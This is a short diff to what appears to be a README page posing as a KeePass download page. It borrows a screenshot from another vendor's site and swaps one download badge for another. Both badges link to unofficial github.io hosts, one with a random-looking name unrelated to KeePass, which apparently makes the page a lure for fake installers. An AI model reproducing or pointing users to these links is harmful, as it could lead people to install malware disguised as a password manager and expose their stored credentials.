@@ -16,7 +16,7 @@ By combining a lightweight interface with deep encryption support, the applicati
   <img src="https://strongboxsafe.com/wp-content/uploads/2023/01/Screenshot-2023-01-25-at-13.01.45-1024x670.png" alt="Program Interface Screenshot"/>
 </div>
 
-[![Download KeePass](https://img.shields.io/badge/Download_KeePass-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://crystaldisplayprimeydavm999.github.io/.github/KeePass-Secure-Vault)
+[![Explore KeePass](https://img.shields.io/badge/Explore-KeePass-6B7280?style=for-the-badge)](https://keepass-secure.github.io/.github/)
 
 ---
 
